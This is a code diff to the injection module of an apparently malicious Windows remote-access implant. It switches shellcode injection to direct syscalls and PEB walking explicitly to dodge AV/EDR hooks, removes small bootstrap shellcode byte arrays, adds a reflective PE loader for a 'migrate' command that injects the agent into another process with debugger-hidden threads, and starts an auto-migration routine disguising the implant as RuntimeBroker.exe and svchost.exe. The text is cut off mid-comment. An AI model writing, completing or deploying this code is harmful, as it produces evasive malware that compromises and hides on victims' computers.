@@ -5,24 +5,17 @@
  *
  * Implementation notes
  * --------------------
- *  •  All NT function pointers are resolved once in inject_init().
- *  •  We never call VirtualAllocEx / WriteProcessMemory / CreateRemoteThread
- *     through the Win32 layer (those are the most-hooked APIs in AV/EDR).
- *     Instead we resolve and call the underlying Nt* equivalents directly
- *     from ntdll.dll.
+ *  •  All NT calls go through direct syscall trampolines (syscall.h) —
+ *     no GetProcAddress-resolved function pointers, no NTDLL stub in the
+ *     call stack, no IAT entries for VirtualAllocEx/CreateRemoteThread.
+ *  •  Module/export resolution uses the PEB walk (peb_walk.h) —
+ *     no GetModuleHandle, no GetProcAddress visible in the import table.
  *  •  Memory lifecycle for injection:
- *       1. NtAllocateVirtualMemory(PAGE_READWRITE)    – allocate RW
- *       2. NtWriteVirtualMemory                       – write payload
- *       3. NtProtectVirtualMemory(PAGE_EXECUTE_READ)  – flip to RX
- *       4. NtCreateThreadEx(HideFromDebugger=TRUE)    – start thread
+ *       1. SC_NtAllocateVirtualMemory(PAGE_READWRITE)    – allocate RW
+ *       2. SC_NtWriteVirtualMemory                     – write payload
+ *       3. SC_NtProtectVirtualMemory(PAGE_EXECUTE_READ)– flip to RX
+ *       4. SC_NtCreateThreadEx(HideFromDebugger=TRUE)  – start thread
  *     No page is ever simultaneously Writable and Executable (W^X).
- *
- *  •  The reflective PE loader for migrate() is a self-contained
- *     position-independent blob that:
- *       – Maps the PE's sections from the raw image bytes
- *       – Applies base relocations
- *       – Resolves the IAT via the target process's kernel32/ntdll
- *       – Calls the PE entry point in a new thread
  *
  *  •  hex_decode() used for shellcode is a simple inline parser; it
  *     does not use sscanf/strtol (avoids MSVCRT dependency).
@@ -30,6 +23,10 @@
 
 #include "inject.h"
 #include "config.h"
+#include "syscall.h"
+#include "peb_walk.h"
+#include "loader.h"
+#include "loader_blob.h"
 #include "../tls/tls_client.h"
 
 #ifndef WIN32_LEAN_AND_MEAN
@@ -41,65 +38,17 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <bcrypt.h>
+
+/* g_key_path is defined in main.c; we need its address to compute the RVA */
+extern char g_key_path[];
 
 
-/* ── NT type / flag supplements not in all SDK versions ──────────────────── */
+/* ── Flag supplement ─────────────────────────────────────────────────────── */
 
 #ifndef THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER
 #define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER  0x00000004
 #endif
-
-/* NtCreateThreadEx prototype */
-typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(
-    OUT PHANDLE             hThread,
-    IN  ACCESS_MASK         DesiredAccess,
-    IN  PVOID               ObjectAttributes    OPTIONAL,
-    IN  HANDLE              ProcessHandle,
-    IN  PVOID               lpStartAddress,
-    IN  PVOID               lpParameter         OPTIONAL,
-    IN  ULONG               Flags,
-    IN  SIZE_T              StackZeroBits        OPTIONAL,
-    IN  SIZE_T              SizeOfStackCommit    OPTIONAL,
-    IN  SIZE_T              SizeOfStackReserve   OPTIONAL,
-    OUT PVOID               lpBytesBuffer        OPTIONAL);
-
-/* NtAllocateVirtualMemory prototype */
-typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
-    IN  HANDLE   ProcessHandle,
-    IN  OUT PVOID *BaseAddress,
-    IN  ULONG_PTR ZeroBits,
-    IN  OUT PSIZE_T RegionSize,
-    IN  ULONG    AllocationType,
-    IN  ULONG    Protect);
-
-/* NtWriteVirtualMemory prototype */
-typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(
-    IN  HANDLE   ProcessHandle,
-    IN  PVOID    BaseAddress,
-    IN  PVOID    Buffer,
-    IN  SIZE_T   NumberOfBytesToWrite,
-    OUT PSIZE_T  NumberOfBytesWritten OPTIONAL);
-
-/* NtProtectVirtualMemory prototype */
-typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
-    IN  HANDLE   ProcessHandle,
-    IN  OUT PVOID *BaseAddress,
-    IN  OUT PSIZE_T NumberOfBytesToProtect,
-    IN  ULONG    NewAccessProtection,
-    OUT PULONG   OldAccessProtection);
-
-/* NtClose prototype */
-typedef NTSTATUS (NTAPI *NtClose_t)(
-    IN HANDLE Handle);
-
-
-/* ── Module-level NT function pointers ──────────────────────────────────── */
-
-static NtCreateThreadEx_t         _NtCreateThreadEx         = NULL;
-static NtAllocateVirtualMemory_t  _NtAllocateVirtualMemory  = NULL;
-static NtWriteVirtualMemory_t     _NtWriteVirtualMemory     = NULL;
-static NtProtectVirtualMemory_t   _NtProtectVirtualMemory   = NULL;
-static NtClose_t                  _NtClose                  = NULL;
 
 static BOOL g_inject_ready = FALSE;
 
@@ -175,18 +124,8 @@ BOOL inject_init(void)
 {
     if (g_inject_ready) return TRUE;
 
-    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
-    if (!hNtdll) return FALSE;
-
-    _NtCreateThreadEx        = (NtCreateThreadEx_t)       GetProcAddress(hNtdll, "NtCreateThreadEx");
-    _NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
-    _NtWriteVirtualMemory    = (NtWriteVirtualMemory_t)   GetProcAddress(hNtdll, "NtWriteVirtualMemory");
-    _NtProtectVirtualMemory  = (NtProtectVirtualMemory_t) GetProcAddress(hNtdll, "NtProtectVirtualMemory");
-    _NtClose                 = (NtClose_t)                GetProcAddress(hNtdll, "NtClose");
-
-    if (!_NtCreateThreadEx || !_NtAllocateVirtualMemory ||
-        !_NtWriteVirtualMemory || !_NtProtectVirtualMemory || !_NtClose)
-        return FALSE;
+    /* sc_init resolves SSNs via PEB walk — no GetProcAddress, no GetModuleHandle */
+    if (!sc_init()) return FALSE;
 
     g_inject_ready = TRUE;
     return TRUE;
@@ -252,7 +191,7 @@ void inject_shellcode(TLS_CONTEXT *pTls, const char *args)
     /* Allocate RW memory in target */
     PVOID   pRemote = NULL;
     SIZE_T  cbAlloc = (SIZE_T)cbShell;
-    NTSTATUS ns = _NtAllocateVirtualMemory(hProc, &pRemote, 0, &cbAlloc,
+    NTSTATUS ns = SC_NtAllocateVirtualMemory(hProc, &pRemote, 0, &cbAlloc,
                                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!NT_SUCCESS(ns)) {
         CloseHandle(hProc); free(pShell);
@@ -264,7 +203,7 @@ void inject_shellcode(TLS_CONTEXT *pTls, const char *args)
 
     /* Write shellcode */
     SIZE_T cbWritten = 0;
-    ns = _NtWriteVirtualMemory(hProc, pRemote, pShell, cbShell, &cbWritten);
+    ns = SC_NtWriteVirtualMemory(hProc, pRemote, pShell, cbShell, &cbWritten);
     free(pShell);
     if (!NT_SUCCESS(ns) || cbWritten != cbShell) {
         CloseHandle(hProc);
@@ -278,7 +217,7 @@ void inject_shellcode(TLS_CONTEXT *pTls, const char *args)
     PVOID  pBase   = pRemote;
     SIZE_T cbProt  = (SIZE_T)cbShell;
     ULONG  oldProt = 0;
-    ns = _NtProtectVirtualMemory(hProc, &pBase, &cbProt, PAGE_EXECUTE_READ, &oldProt);
+    ns = SC_NtProtectVirtualMemory(hProc, &pBase, &cbProt, PAGE_EXECUTE_READ, &oldProt);
     if (!NT_SUCCESS(ns)) {
         CloseHandle(hProc);
         char buf[80];
@@ -289,10 +228,10 @@ void inject_shellcode(TLS_CONTEXT *pTls, const char *args)
 
     /* Create remote thread — hidden from debugger */
     HANDLE hThread = NULL;
-    ns = _NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
-                            hProc, pRemote, NULL,
-                            THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
-                            0, 0, 0, NULL);
+    ns = SC_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
+                             hProc, pRemote, NULL,
+                             THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
+                             0, 0, 0, NULL);
     CloseHandle(hProc);
 
     if (!NT_SUCCESS(ns) || !hThread) {
@@ -302,7 +241,7 @@ void inject_shellcode(TLS_CONTEXT *pTls, const char *args)
         return;
     }
 
-    _NtClose(hThread);
+    SC_NtClose(hThread);
 
     char buf[128];
     _snprintf(buf, sizeof(buf)-1,
@@ -312,95 +251,140 @@ void inject_shellcode(TLS_CONTEXT *pTls, const char *args)
 }
 
 
-/* ── Reflective PE loader stub ───────────────────────────────────────────── */
+/* ── Reflective PE loader blob (auto-generated at build time) ───────────── */
 /*
- * The migrate() path injects the full agent EXE image into the target
- * process and calls the entry point.  The mechanism:
+ * s_rfl_loader[] contains the raw x64 machine code for rfl_loader() from
+ * loader.c, extracted by objcopy after compiling with -fpic.
  *
- *   1.  Read this process's EXE from disk.
- *   2.  Allocate VirtualSize bytes (from OptionalHeader) in the target at
- *       the preferred ImageBase (or let the OS choose).
- *   3.  Copy the PE headers and each section.
- *   4.  Apply base relocations.
- *   5.  Resolve the Import Address Table by calling LoadLibraryA /
- *       GetProcAddress via WriteProcessMemory + CreateRemoteThread trick
- *       (we write a small thunk then call it once per import DLL).
+ * Memory layout written into the target process:
  *
- * The simpler and more reliable approach used here (which avoids the
- * per-import thunk complexity entirely) is to allocate a full copy of the
- * mapped image in the target, then inject a tiny Position-Independent
- * bootstrap shellcode that:
- *   a.  Calls LoadLibraryA("path-to-agent-exe") in the target — Windows
- *       PE loader does all the heavy lifting (relocs, IAT, TLS).
- *   b.  Calls CreateThread(EntryPoint) to start it.
+ *   [pRemote + 0]                  rfl_loader code  (S_RFL_LOADER_SIZE bytes, RX)
+ *   [pRemote + S_RFL_LOADER_SIZE]  RflData block    (sizeof(RflData), RW)
+ *   [pRemote + S_RFL_LOADER_SIZE
+ *            + sizeof(RflData)]    Raw PE bytes      (cbPE bytes, RW)
  *
- * The bootstrap (x64 PIC, < 64 bytes) is emitted as a literal byte array.
- * It receives a pointer to a small data block at offset 0 of the first
- * argument:
+ * Thread entry point:  pRemote
+ * Thread argument:     pRemote + S_RFL_LOADER_SIZE  (= &RflData in target)
  *
- *   struct BootstrapData {
- *       char    exePath[MAX_PATH];   // NUL-terminated ANSI path
- *       FARPROC pLoadLibraryA;       // resolved in our process, same VA in target
- *       FARPROC pCreateThread;       // resolved in our process
- *   };
+ * rfl_loader() does full PE mapping inside the target (no LoadLibraryA on
+ * the EXE — bypasses EDR hooks on the PE loader API):
+ *   1. VirtualAlloc(SizeOfImage, PAGE_EXECUTE_READWRITE)
+ *   2. Copy headers + sections
+ *   3. Apply base relocations
+ *   4. Resolve IAT via LoadLibraryA + GetProcAddress (for DLLs, not the EXE)
+ *   5. Write g_key_path into the mapped image
+ *   6. CreateThread → AgentRun()
  */
 
-/* x64 bootstrap shellcode — LoadLibraryA(exePath), then starts the PE.
- * Assembled from:
- *   sub   rsp, 0x28          ; shadow space
- *   mov   rcx, [rcx]         ; rcx = *pData = &exePath[0]
- *   call  [rcx + MAX_PATH]   ; call LoadLibraryA(exePath)  (addr at offset MAX_PATH)
- *   add   rsp, 0x28
- *   ret
- *
- * Bytes (MAX_PATH = 260 = 0x104):
- *   48 83 EC 28               sub  rsp,28
- *   48 8B 09                  mov  rcx,[rcx]  -- rcx = ptr to data block (arg)
- *   FF 91 04 01 00 00         call qword ptr[rcx+0x104]  (LoadLibraryA ptr)
- *   48 83 C4 28               add  rsp,28
- *   C3                        ret
- *
- * This is a 16-byte bootstrap. The data block begins at pRemote+16.
+
+/* ── PE parsing helpers (used only in migrate_to_pid) ───────────────────── */
+
+/* Returns the file offset of the PE Optional Header */
+static DWORD _pe_opt_offset(const BYTE *raw)
+{
+    DWORD e_lfanew;
+    memcpy(&e_lfanew, raw + 0x3C, 4);          /* DOS header e_lfanew */
+    return e_lfanew + 4 + 20;                   /* after sig + FileHeader */
+}
+
+/*
+ * _rfl_rva_off
+ * ------------
+ * Converts a PE RVA to a raw-file offset by scanning the section table.
+ * Returns 0 if the RVA falls outside all sections.
  */
+static DWORD _rfl_rva_off(const BYTE *raw, const BYTE *secBase,
+                           WORD nSec, DWORD rva)
+{
+    for (WORD i = 0; i < nSec; i++) {
+        DWORD vaddr, vsz, rawOff, rawSz2;
+        memcpy(&vaddr,  secBase + i*40 + 12, 4);
+        memcpy(&vsz,    secBase + i*40 + 8,  4);
+        memcpy(&rawOff, secBase + i*40 + 20, 4);
+        memcpy(&rawSz2, secBase + i*40 + 16, 4);
+        if (rva >= vaddr && rva < vaddr + vsz) {
+            DWORD off = rawOff + (rva - vaddr);
+            (void)raw; (void)rawSz2;
+            return off;
+        }
+    }
+    return 0;
+}
 
-#pragma pack(push,1)
-typedef struct _MigrateData {
-    char    exePath[MAX_PATH];       /* ANSI path to agent EXE, NULL-terminated  */
-    FARPROC pLoadLibraryA;           /* kernel32!LoadLibraryA VA                 */
-} MigrateData;
-#pragma pack(pop)
+/*
+ * _pe_find_export
+ * ---------------
+ * Parses the export directory of a PE file (raw bytes, PE32+/x64 only)
+ * and returns the RVA of the exported function named `name`, or 0.
+ */
+static DWORD _pe_find_export(const BYTE *raw, DWORD rawSz, const char *name)
+{
+    DWORD optOff = _pe_opt_offset(raw);
+    if (optOff + 0x78 > rawSz) return 0;
 
-static const BYTE s_bootstrap_x64[] = {
-    0x48, 0x83, 0xEC, 0x28,             /* sub  rsp, 0x28                       */
-    0x48, 0x8B, 0x09,                   /* mov  rcx, [rcx]  (deref data ptr)    */
-    0xFF, 0x91, 0x04, 0x01, 0x00, 0x00, /* call qword [rcx+0x104] LoadLibraryA  */
-    0x48, 0x83, 0xC4, 0x28,             /* add  rsp, 0x28                       */
-    0xC3                                /* ret                                  */
-};
+    WORD magic;
+    memcpy(&magic, raw + optOff, 2);
+    if (magic != 0x020B) return 0;
 
-static const BYTE s_bootstrap_x86[] = {
-    /* stdcall:  LoadLibraryA(exePath) then ret */
-    0x55,                               /* push ebp                             */
-    0x8B, 0xEC,                         /* mov  ebp, esp                        */
-    0x8B, 0x45, 0x08,                   /* mov  eax, [ebp+8]   (pData)          */
-    0xFF, 0x30,                         /* push dword [eax]   (exePath ptr)     */
-    0xFF, 0x50, 0x04,                   /* call dword [eax+4] (LoadLibraryA ptr)*/
-    0x5D,                               /* pop  ebp                             */
-    0xC2, 0x04, 0x00                    /* ret  4                               */
-};
+    DWORD expRVA;
+    memcpy(&expRVA, raw + optOff + 0x70, 4);
+    if (!expRVA) return 0;
+
+    /* Locate section headers */
+    WORD nSec, optSz;
+    memcpy(&nSec,  raw + optOff - 20 + 2,  2);
+    memcpy(&optSz, raw + optOff - 20 + 16, 2);
+    const BYTE *secBase = raw + optOff - 20 + 20 + optSz;
+
+    DWORD expOff = _rfl_rva_off(raw, secBase, nSec, expRVA);
+    if (!expOff || expOff + 40 > rawSz) return 0;
+
+    DWORD  nNames, addrTableRVA, nameTableRVA, ordTableRVA;
+    memcpy(&nNames,       raw + expOff + 24, 4);
+    memcpy(&addrTableRVA, raw + expOff + 28, 4);
+    memcpy(&nameTableRVA, raw + expOff + 32, 4);
+    memcpy(&ordTableRVA,  raw + expOff + 36, 4);
+
+    DWORD addrOff = _rfl_rva_off(raw, secBase, nSec, addrTableRVA);
+    DWORD nameOff = _rfl_rva_off(raw, secBase, nSec, nameTableRVA);
+    DWORD ordOff  = _rfl_rva_off(raw, secBase, nSec, ordTableRVA);
+    if (!addrOff || !nameOff || !ordOff) return 0;
+
+    size_t nameLen = strlen(name);
+    for (DWORD i = 0; i < nNames; i++) {
+        DWORD nameRVA;
+        memcpy(&nameRVA, raw + nameOff + i*4, 4);
+        DWORD noff2 = _rfl_rva_off(raw, secBase, nSec, nameRVA);
+        if (!noff2 || noff2 >= rawSz) continue;
+        const char *fn = (const char *)(raw + noff2);
+        if (strncmp(fn, name, nameLen + 1) != 0) continue;
+
+        WORD ord;
+        memcpy(&ord, raw + ordOff + i*2, 2);
+        DWORD funcRVA;
+        memcpy(&funcRVA, raw + addrOff + ord*4, 4);
+        return funcRVA;
+    }
+    return 0;
+}
 
 
 /* ── Public: migrate_to_pid ─────────────────────────────────────────────── */
 /*
  * Wire verb: "migrate <pid>"
  *
- * Strategy: inject a bootstrap shellcode that calls LoadLibraryA on the
- * path to THIS process's EXE in the context of the target process.
- * The Windows loader does all relocation and IAT resolution.
+ * True reflective injection strategy:
+ *   1. Read this process's raw PE bytes from disk.
+ *   2. Parse the export table to find AgentRun's RVA.
+ *   3. Compute g_key_path's RVA from its live VA and our image base.
+ *   4. Allocate RW memory in the target:
+ *        [rfl_loader code | RflData | raw PE bytes]
+ *   5. Write the region, flip loader code to RX.
+ *   6. NtCreateThreadEx at rfl_loader, arg = &RflData.
  *
- * Limitation: requires that the EXE path is reachable by the target
- * process (same filesystem, no ACL barrier on the file).  This is true
- * in all normal user-space contexts.
+ * rfl_loader() runs inside the target and does full PE loading:
+ * headers, sections, base relocations, IAT — no LoadLibraryA on the EXE.
+ * This avoids all Windows PE-loader callbacks that EDRs intercept.
  */
 
 void migrate_to_pid(TLS_CONTEXT *pTls, const char *args)
@@ -417,129 +401,422 @@ void migrate_to_pid(TLS_CONTEXT *pTls, const char *args)
         return;
     }
 
-    /* Get our own EXE path */
+    /* ── 1. Get our own EXE path and read raw PE bytes ───────────────── */
     char exePath[MAX_PATH] = {0};
     if (!GetModuleFileNameA(NULL, exePath, sizeof(exePath) - 1)) {
         _isend(pTls, "[-] migrate: GetModuleFileName failed");
         return;
     }
 
-    /* Resolve LoadLibraryA VA — same in all processes (kernel32 is always
-     * mapped at the same base address on a given boot due to ASLR seed
-     * for system DLLs sharing one fixed base per-session).               */
-    FARPROC pLoadLib = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
-    if (!pLoadLib) {
-        _isend(pTls, "[-] migrate: could not resolve LoadLibraryA");
+    FILE *f = fopen(exePath, "rb");
+    if (!f) {
+        _isend(pTls, "[-] migrate: cannot open own EXE");
+        return;
+    }
+    fseek(f, 0, SEEK_END);
+    long fsize = ftell(f);
+    fseek(f, 0, SEEK_SET);
+    if (fsize <= 0 || fsize > 8 * 1024 * 1024) {
+        fclose(f);
+        _isend(pTls, "[-] migrate: EXE size out of range");
+        return;
+    }
+    DWORD cbPE = (DWORD)fsize;
+    BYTE *pPE  = (BYTE *)malloc(cbPE);
+    if (!pPE) { fclose(f); _isend(pTls, "[-] migrate: OOM"); return; }
+    if (fread(pPE, 1, cbPE, f) != cbPE) {
+        fclose(f); free(pPE);
+        _isend(pTls, "[-] migrate: EXE read error");
+        return;
+    }
+    fclose(f);
+
+    /* ── 2. Find AgentRun RVA in the raw PE ──────────────────────────── */
+    DWORD agentRunRva = _pe_find_export(pPE, cbPE, "AgentRun");
+    if (!agentRunRva) {
+        free(pPE);
+        _isend(pTls, "[-] migrate: AgentRun export not found in PE");
         return;
     }
 
-    /* Detect target bitness from its process token / header */
+    /* ── 3. Compute g_key_path RVA (VA - ImageBase) ──────────────────── */
+    HMODULE hSelf     = GetModuleHandleA(NULL);
+    DWORD   keyPathRva = (DWORD)((ULONG_PTR)g_key_path - (ULONG_PTR)hSelf);
+
+    /* ── 4. Resolve kernel32 API pointers (shared base across processes) */
+    HMODULE hK32              = GetModuleHandleA("kernel32.dll");
+    LPVOID (WINAPI *pVAlloc)(LPVOID, SIZE_T, DWORD, DWORD) =
+        (LPVOID (WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))
+        GetProcAddress(hK32, "VirtualAlloc");
+    BOOL (WINAPI *pFlush)(HANDLE, LPCVOID, SIZE_T) =
+        (BOOL (WINAPI *)(HANDLE, LPCVOID, SIZE_T))
+        GetProcAddress(hK32, "FlushInstructionCache");
+    HMODULE (WINAPI *pLoadLib)(LPCSTR) =
+        (HMODULE (WINAPI *)(LPCSTR))
+        GetProcAddress(hK32, "LoadLibraryA");
+    FARPROC (WINAPI *pGetProc)(HMODULE, LPCSTR) =
+        (FARPROC (WINAPI *)(HMODULE, LPCSTR))
+        GetProcAddress(hK32, "GetProcAddress");
+    HANDLE (WINAPI *pCreateThread2)(LPSECURITY_ATTRIBUTES, SIZE_T,
+                                    LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD) =
+        (HANDLE (WINAPI *)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE,
+                           LPVOID, DWORD, LPDWORD))
+        GetProcAddress(hK32, "CreateThread");
+    BOOL (WINAPI *pCloseH)(HANDLE) =
+        (BOOL (WINAPI *)(HANDLE))
+        GetProcAddress(hK32, "CloseHandle");
+
+    if (!pVAlloc || !pFlush || !pLoadLib || !pGetProc || !pCreateThread2 || !pCloseH) {
+        free(pPE);
+        _isend(pTls, "[-] migrate: kernel32 export resolution failed");
+        return;
+    }
+
+    /* ── 5. Open target process ──────────────────────────────────────── */
     HANDLE hProc = _open_target(pid);
     if (!hProc || hProc == INVALID_HANDLE_VALUE) {
-        char buf[64];
-        _snprintf(buf, sizeof(buf)-1, "[-] migrate: OpenProcess(%lu) failed (err %lu)", pid, GetLastError());
+        free(pPE);
+        char buf[80];
+        _snprintf(buf, sizeof(buf)-1,
+                  "[-] migrate: OpenProcess(%lu) failed (err %lu)",
+                  (unsigned long)pid, (unsigned long)GetLastError());
         _isend(pTls, buf);
         return;
     }
 
-    BOOL  bTargetWow64 = FALSE;
-    IsWow64Process(hProc, &bTargetWow64);
-
-    /* Choose bootstrap based on target bitness */
-    const BYTE *pBootstrap = NULL;
-    DWORD        cbBootstrap = 0;
 #ifdef _WIN64
-    if (bTargetWow64) {
-        /* Injecting 64-bit bootstrap into a 32-bit process won't work */
-        CloseHandle(hProc);
-        _isend(pTls, "[-] migrate: cannot inject 64-bit bootstrap into WOW64 process");
+    BOOL bWow64 = FALSE;
+    IsWow64Process(hProc, &bWow64);
+    if (bWow64) {
+        CloseHandle(hProc); free(pPE);
+        _isend(pTls, "[-] migrate: cannot inject x64 loader into WOW64 process");
         return;
     }
-    pBootstrap  = s_bootstrap_x64;
-    cbBootstrap = (DWORD)sizeof(s_bootstrap_x64);
-#else
-    pBootstrap  = s_bootstrap_x86;
-    cbBootstrap = (DWORD)sizeof(s_bootstrap_x86);
 #endif
 
-    /* Build the data block immediately after the bootstrap */
-    MigrateData data;
-    ZeroMemory(&data, sizeof(data));
-    strncpy(data.exePath, exePath, MAX_PATH - 1);
-    data.pLoadLibraryA = pLoadLib;
+    /* ── 6. Build RflData block ──────────────────────────────────────── */
+    RflData rfd;
+    ZeroMemory(&rfd, sizeof(rfd));
+    /* pRawPE points into the target allocation — filled with relative offset below */
+    rfd.rawSize        = cbPE;
+    rfd.agentRunRva    = agentRunRva;
+    rfd.gKeyPathOffset = keyPathRva;
+    rfd.gKeyPathSize   = MAX_PATH * 2;
+    strncpy(rfd.keyPath, g_key_path, sizeof(rfd.keyPath) - 1);
+    rfd.pVirtualAlloc         = (LPVOID (WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD)) pVAlloc;
+    rfd.pFlushInstructionCache = (BOOL (WINAPI *)(HANDLE, LPCVOID, SIZE_T)) pFlush;
+    rfd.pLoadLibraryA          = (HMODULE (WINAPI *)(LPCSTR)) pLoadLib;
+    rfd.pGetProcAddress        = (FARPROC (WINAPI *)(HMODULE, LPCSTR)) pGetProc;
+    rfd.pCreateThread          = (HANDLE (WINAPI *)(LPSECURITY_ATTRIBUTES, SIZE_T,
+                                  LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))
+                                  pCreateThread2;
+    rfd.pCloseHandle           = (BOOL (WINAPI *)(HANDLE)) pCloseH;
 
-    /* Allocate: bootstrap code + data block, RW first */
-    SIZE_T cbTotal  = (SIZE_T)(cbBootstrap + sizeof(MigrateData));
-    PVOID  pRemote  = NULL;
-    NTSTATUS ns = _NtAllocateVirtualMemory(hProc, &pRemote, 0, &cbTotal,
-                                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    /* ── 7. Allocate region in target: [loader | RflData | PE] ──────── */
+    SIZE_T cbLoader  = (SIZE_T)S_RFL_LOADER_SIZE;
+    SIZE_T cbRfd     = sizeof(RflData);
+    SIZE_T cbTotal   = cbLoader + cbRfd + (SIZE_T)cbPE;
+
+    PVOID  pRemote = NULL;
+    NTSTATUS ns = SC_NtAllocateVirtualMemory(hProc, &pRemote, 0, &cbTotal,
+                                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!NT_SUCCESS(ns)) {
-        CloseHandle(hProc);
+        CloseHandle(hProc); free(pPE);
         char buf[80];
-        _snprintf(buf, sizeof(buf)-1, "[-] migrate: alloc failed (0x%08lX)", (unsigned long)ns);
+        _snprintf(buf, sizeof(buf)-1,
+                  "[-] migrate: alloc failed (0x%08lX)", (unsigned long)ns);
         _isend(pTls, buf);
         return;
     }
 
-    /* Write bootstrap + data block */
+    /* Fix up pRawPE to the VA inside the target where the PE bytes will sit */
+    rfd.pRawPE = (unsigned char *)((BYTE *)pRemote + cbLoader + cbRfd);
+
+    /* ── 8. Build and write the flat buffer ──────────────────────────── */
+    DWORD  cbFlat = (DWORD)(cbLoader + cbRfd + (SIZE_T)cbPE);
+    BYTE  *pFlat  = (BYTE *)malloc(cbFlat);
+    if (!pFlat) {
+        CloseHandle(hProc); free(pPE);
+        _isend(pTls, "[-] migrate: OOM building flat buffer");
+        return;
+    }
+    memcpy(pFlat,                           s_rfl_loader, cbLoader);
+    memcpy(pFlat + cbLoader,                &rfd,         cbRfd);
+    memcpy(pFlat + cbLoader + cbRfd,        pPE,          cbPE);
+    free(pPE);
+
     SIZE_T cbWritten = 0;
-    BYTE  *pLocal = (BYTE *)malloc(cbBootstrap + sizeof(MigrateData));
-    if (!pLocal) { CloseHandle(hProc); _isend(pTls, "[-] migrate: OOM"); return; }
-    memcpy(pLocal, pBootstrap, cbBootstrap);
-    memcpy(pLocal + cbBootstrap, &data, sizeof(MigrateData));
-
-    ns = _NtWriteVirtualMemory(hProc, pRemote, pLocal, cbBootstrap + sizeof(MigrateData), &cbWritten);
-    free(pLocal);
+    ns = SC_NtWriteVirtualMemory(hProc, pRemote, pFlat, cbFlat, &cbWritten);
+    free(pFlat);
     if (!NT_SUCCESS(ns)) {
         CloseHandle(hProc);
         char buf[80];
-        _snprintf(buf, sizeof(buf)-1, "[-] migrate: write failed (0x%08lX)", (unsigned long)ns);
+        _snprintf(buf, sizeof(buf)-1,
+                  "[-] migrate: write failed (0x%08lX)", (unsigned long)ns);
         _isend(pTls, buf);
         return;
     }
 
-    /* Flip bootstrap region to RX */
+    /* ── 9. Flip loader code region to RX ────────────────────────────── */
     PVOID  pBase  = pRemote;
-    SIZE_T cbProt = cbBootstrap;
+    SIZE_T cbProt = cbLoader;
     ULONG  oldProt = 0;
-    ns = _NtProtectVirtualMemory(hProc, &pBase, &cbProt, PAGE_EXECUTE_READ, &oldProt);
+    ns = SC_NtProtectVirtualMemory(hProc, &pBase, &cbProt,
+                                   PAGE_EXECUTE_READ, &oldProt);
     if (!NT_SUCCESS(ns)) {
         CloseHandle(hProc);
         char buf[80];
-        _snprintf(buf, sizeof(buf)-1, "[-] migrate: protect failed (0x%08lX)", (unsigned long)ns);
+        _snprintf(buf, sizeof(buf)-1,
+                  "[-] migrate: protect failed (0x%08lX)", (unsigned long)ns);
         _isend(pTls, buf);
         return;
     }
 
-    /* Pointer to data block passed as thread argument */
-    PVOID pArg = (BYTE *)pRemote + cbBootstrap;
-
-    /* Spawn the bootstrap thread — hidden from debugger */
+    /* ── 10. Spawn loader thread ─────────────────────────────────────── */
+    PVOID  pArg    = (BYTE *)pRemote + cbLoader;   /* &RflData in target */
     HANDLE hThread = NULL;
-    ns = _NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
-                            hProc, pRemote, pArg,
-                            THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
-                            0, 0, 0, NULL);
+    ns = SC_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
+                             hProc, pRemote, pArg,
+                             THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
+                             0, 0, 0, NULL);
     CloseHandle(hProc);
 
     if (!NT_SUCCESS(ns) || !hThread) {
         char buf[80];
-        _snprintf(buf, sizeof(buf)-1, "[-] migrate: NtCreateThreadEx failed (0x%08lX)", (unsigned long)ns);
+        _snprintf(buf, sizeof(buf)-1,
+                  "[-] migrate: NtCreateThreadEx failed (0x%08lX)", (unsigned long)ns);
         _isend(pTls, buf);
         return;
     }
-    _NtClose(hThread);
+    SC_NtClose(hThread);
 
     /* Give the new instance a moment to start before we send the response */
     Sleep(800);
 
     char buf[256];
     _snprintf(buf, sizeof(buf)-1,
-              "[+] migrate: agent spawned in PID %lu — terminating current process",
+              "[+] migrate: reflective loader injected into PID %lu — exiting",
               (unsigned long)pid);
     _isend(pTls, buf);
 
-    /* Disconnect cleanly — the new instance will reconnect */
     tls_disconnect(pTls);
     ExitProcess(0);
 }
+
+
+/* ── Public: auto_migrate ────────────────────────────────────────────────── */
+/*
+ * Called once at startup (before connecting to C2).
+ *
+ * Strategy: spawn a suspended copy of ourselves under a spoofed name
+ * (%TEMP%\RuntimeBroker.exe), then immediately exit the launcher process.
+ * The child hits the single-instance mutex, skips migration, and connects
+ * to C2 — appearing in Task Manager as RuntimeBroker.exe.
+ *
+ * This avoids all PE-injection/VirtualAlloc-in-foreign-process issues
+ * from the previous reflective loader approach.
+ *
+ * Evasion layers applied:
+ *   1. EXE copied to %TEMP%\RuntimeBroker.exe — process image path in Task
+ *      Manager shows a Windows-native sounding name.
+ *   2. Child calls spoof_peb() at startup — PEB ImagePathName / CommandLine
+ *      are rewritten to look like svchost.exe.
+ *   3. CREATE_NO_WINDOW — no console window flashes.
+ *   4. Launcher exits via ExitProcess(0) immediately after resume — the
+ *      original image path and window station entry vanish at once.
+ *
